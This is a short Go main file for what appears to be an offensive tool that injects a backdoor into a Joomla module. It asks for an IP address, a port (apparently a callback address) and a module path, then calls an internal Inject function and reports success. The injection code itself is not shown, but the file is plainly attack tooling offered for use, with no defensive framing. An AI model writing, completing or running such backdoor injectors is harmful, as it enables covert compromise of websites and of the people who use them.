package main

import (
    "fmt"

    "data"
    "internals"
    "utils"
)

func main() {
    var port uint16
    var ip string
    var modulePath string

    utils.Print(data.Green, utils.Banner)

    utils.Print(data.Blue, "[+] Type your ip address => ")
    fmt.Scan(&ip)

    utils.Print(data.Blue, "[+] Type your port => ")
    fmt.Scan(&port)

    utils.Print(data.Blue, "[+] Type the path of your Joomla module => ")
    fmt.Scan(&modulePath)

    err := internals.Inject(ip, port, modulePath)
    if err != "" {
        utils.Print(data.Red, "[-] %s", err)
    } else {
        utils.Print(data.Green, "[+] Backdoor injected successfully")
    }
}